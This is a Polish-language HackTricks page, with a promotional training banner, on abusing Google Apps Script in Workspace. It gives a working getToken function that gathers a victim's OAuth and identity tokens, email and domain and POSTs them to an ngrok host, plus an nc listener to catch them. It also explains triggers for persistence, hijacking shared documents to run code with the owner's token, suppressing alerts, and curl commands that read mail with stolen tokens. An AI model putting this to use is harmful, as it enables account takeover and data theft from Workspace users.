# GWS - Skrypty aplikacji

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Skrypty aplikacji

Skrypty aplikacji to **kod, który zostanie uruchomiony, gdy użytkownik z uprawnieniami edytora uzyska dostęp do dokumentu, z którym jest powiązany Skrypt aplikacji** i po **zaakceptowaniu monitu OAuth**.\
Mogą również być ustawione do **wykonywania się co jakiś czas** przez właściciela Skryptu aplikacji (Persistencja).

### Utwórz Skrypt aplikacji

Istnieje kilka sposobów tworzenia Skryptu aplikacji, chociaż najczęstsze to **z dokumentu Google (dowolnego typu)** oraz jako **samodzielny projekt**:

<details>

<summary>Utwórz projekt powiązany z kontenerem z dokumentów Google Docs, Arkuszy kalkulacyjnych lub Prezentacji</summary>

1. Otwórz dokument Docs, arkusz kalkulacyjny Sheets lub prezentację Slides.
2. Kliknij **Rozszerzenia** > **Skrypty Google Apps**.
3. W edytorze skryptów kliknij **Bez tytułu**.
4. Nadaj swojemu projektowi nazwę i kliknij **Zmień nazwę**.

</details>

<details>

<summary>Utwórz samodzielny projekt</summary>

Aby utworzyć samodzielny projekt w Skrypcie aplikacji:

1. Przejdź do [`script.google.com`](https://script.google.com/).
2. Kliknij **Nowy projekt**.
3. W edytorze skryptów kliknij **Bez tytułu**.
4. Nadaj swojemu projektowi nazwę i kliknij **Zmień nazwę**.

</details>

<details>

<summary>Utwórz samodzielny projekt z Google Drive</summary>

1. Otwórz [Google Drive](https://drive.google.com/).
2. Kliknij **Nowy** > **Więcej** > **Skrypty Google Apps**.

</details>

<details>

<summary>Utwórz projekt powiązany z kontenerem z formularza Google Forms</summary>

1. Otwórz formularz w Google Forms.
2. Kliknij Więcej more\_vert > **Edytor skryptów**.
3. W edytorze skryptów kliknij **Bez tytułu**.
4. Nadaj swojemu projektowi nazwę i kliknij **Zmień nazwę**.

</details>

<details>

<summary>Utwórz samodzielny projekt, korzystając z narzędzia wiersza poleceń clasp</summary>

`clasp` to narzędzie wiersza poleceń, które pozwala tworzyć, pobierać/wysyłać i wdrażać projekty Skryptu aplikacji z terminala.

Zobacz [Przewodnik po interfejsie wiersza poleceń za pomocą `clasp`](https://developers.google.com/apps-script/guides/clasp) dla więcej szczegółów.

</details>

## Scenariusz Skryptu aplikacji <a href="#create-using-clasp" id="create-using-clasp"></a>

### Utwórz arkusz Google z Skryptem aplikacji

Zacznij od utworzenia Skryptu aplikacji, moja rekomendacja dla tego scenariusza to utworzenie arkusza Google i przejdź do **`Rozszerzenia > Skrypty aplikacji`**, co otworzy dla Ciebie **nowy Skrypt aplikacji powiązany z arkuszem**.

### Wyciek tokena

Aby udzielić dostępu do tokenu OAuth, musisz kliknąć **`Usługi +` i dodać zakresy takie jak**:

* **AdminDirectory**: Dostęp do użytkowników i grup katalogu (jeśli użytkownik ma wystarczające uprawnienia)
* **Gmail**: Dostęp do danych gmaila
* **Drive**: Dostęp do danych dysku
* **Google Sheets API**: Aby działał z wyzwalaczem

Aby samodzielnie **zmienić wymagane zakresy**, możesz przejść do ustawień projektu i włączyć: **`Pokaż plik manifestu "appsscript.json" w edytorze`.**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Aby przechwycić żądanie, wystarczy uruchomić:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### Uprawnienia żądane do wykonania Skryptu aplikacji:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Podczas zewnętrznego żądania zostanie wyświetlony monit OAuth, który również **poprosi o zgodę na dotarcie do zewnętrznych punktów końcowych**.
{% endhint %}

### Tworzenie wyzwalacza

Po otwarciu aplikacji kliknij **⏰ Wyzwalacze**, aby utworzyć wyzwalacz. Jako **funkcję** wybierz **`getToken`**, uruchamianą podczas wdrożenia **`Head`**, w źródle zdarzenia wybierz **`Z arkusza kalkulacyjnego`**, a typ zdarzenia wybierz **`Przy otwarciu`** lub **`Przy edycji`** (zgodnie z potrzebami) i zapisz.

Zauważ, że możesz sprawdzić **uruchomienia Skryptów aplikacji w karcie Wykonania**, jeśli chcesz coś debugować.

### Udostępnianie

Aby **uruchomić** **Skrypt aplikacji**, ofiara musi połączyć się z dostępem **Edytora**.

{% hint style="success" %}
**Token** używany do wykonania **Skryptu aplikacji** będzie tym **twórcy wyzwalacza**, nawet jeśli plik jest otwarty jako Edytor przez innych użytkowników.
{% endhint %}

### Nadużywanie dokumentów udostępnionych wraz ze mną

{% hint style="danger" %}
Jeśli ktoś **udostępnił ci dokument z Skryptami aplikacji i wyzwalaczem korzystając z opcji Head** Skryptu aplikacji (a nie z wdrożeniem stałym), możesz zmodyfikować kod Skryptu aplikacji (dodając na przykład funkcje kradzieży tokenów), uzyskać do niego dostęp, a **Skrypt aplikacji zostanie wykonany z uprawnieniami użytkownika, który udostępnił dokument tobie**! (zauważ, że token OAuth właściciela będzie miał zakresy dostępu określone podczas tworzenia wyzwalacza).

**Powiadomienie zostanie wysłane do twórcy skryptu wskazujące, że ktoś zmodyfikował skrypt** (A co powiesz na wykorzystanie uprawnień gmail do wygenerowania filtra w celu zapobieżenia alertowi?)
{% endhint %}

{% hint style="success" %}
Jeśli **atakujący zmodyfikuje zakresy Skryptu aplikacji**, aktualizacje **nie zostaną zastosowane** do dokumentu, dopóki nie zostanie utworzony **nowy wyzwalacz** z wprowadzonymi zmianami. Dlatego atakujący nie będzie mógł ukraść tokenu twórcy z większymi zakresami niż te, które ustawił w utworzonym przez siebie wyzwalaczu.
{% endhint %}

### Kopiowanie zamiast udostępniania

Podczas tworzenia łącza do udostępnienia dokumentu tworzy się łącze podobne do tego: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Jeśli **zmienisz** końcówkę **"/edit"** na **"/copy"**, zamiast uzyskać dostęp, Google zapyta, czy chcesz **wygenerować kopię dokumentu:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Jeśli użytkownik utworzy kopię i uzyska do niej dostęp, **zawartość dokumentu i Skrypty aplikacji zostaną skopiowane**, jednak **wyzwalacze nie**, dlatego **nic nie zostanie wykonane**.

### Udostępnianie jako aplikacja internetowa

Zauważ, że możliwe jest również **udostępnienie Skryptu aplikacji jako aplikacji internetowej** (w Edytorze Skryptu aplikacji, wdroż jako aplikację internetową), ale pojawi się taki alert:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Następnie pojawi się **typowy monit OAuth pytający** o wymagane uprawnienia.

### Testowanie

Możesz przetestować zebrany token, aby wyświetlić maile za pomocą:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendarza użytkownika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Skrypt aplikacji jako trwałość

Jedną z opcji trwałości byłoby **utworzenie dokumentu i dodanie wyzwalacza dla funkcji getToken** oraz udostępnienie dokumentu atakującemu, aby za każdym razem, gdy atakujący otworzy plik, **wyciekł token ofiary**.

Możliwe jest również utworzenie skryptu aplikacji i ustawienie wyzwalacza co X czasu (na przykład co minutę, godzinę, dzień...). Atakujący, który **skompromitował dane uwierzytelniające lub sesję ofiary, mógłby ustawić wyzwalacz czasowy skryptu aplikacji i ujawnić bardzo uprzywilejowany token OAuth codziennie**:

Po prostu utwórz skrypt aplikacji, przejdź do Wyzwalaczy, kliknij Dodaj wyzwalacz i wybierz jako źródło zdarzenia Wyzwalany czasem, a następnie wybierz opcje, które najlepiej Ci odpowiadają:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Spowoduje to wysłanie alertu bezpieczeństwa e-mailem oraz powiadomienie push na Twoim urządzeniu mobilnym o tym.
{% endhint %}

### Pomijanie niezweryfikowanego monitu o udostępnionym dokumencie

Co więcej, jeśli ktoś **udostępnił** Ci dokument z **uprawnieniami edytora**, możesz generować **skrypty aplikacji wewnątrz dokumentu**, a **WŁAŚCICIEL (twórca) dokumentu będzie właścicielem skryptu aplikacji**.

{% hint style="warning" %}
Oznacza to, że **twórca dokumentu będzie widoczny jako twórca dowolnego skryptu aplikacji**, który ktokolwiek z uprawnieniami edytora utworzy wewnątrz niego.

Oznacza to również, że **skrypt aplikacji będzie zaufany przez środowisko Workspace** twórcy dokumentu.
{% endhint %}

{% hint style="danger" %}
Oznacza to również, że jeśli **skrypt aplikacji już istniał** i ludzie **udzielili dostępu**, każdy z uprawnieniami **Edytora** w dokumencie może go **modyfikować i nadużywać tego dostępu**.\
Aby to nadużyć, konieczne jest również, aby ludzie wywołali skrypt aplikacji. I jednym sprytnym trikiem jest **opublikowanie skryptu jako aplikacji internetowej**. Gdy **ludzie**, którzy już **udzielili dostępu** do skryptu aplikacji, odwiedzą stronę internetową, wywołają **skrypt aplikacji** (to również działa za pomocą tagów `<img>`).
{% endhint %}
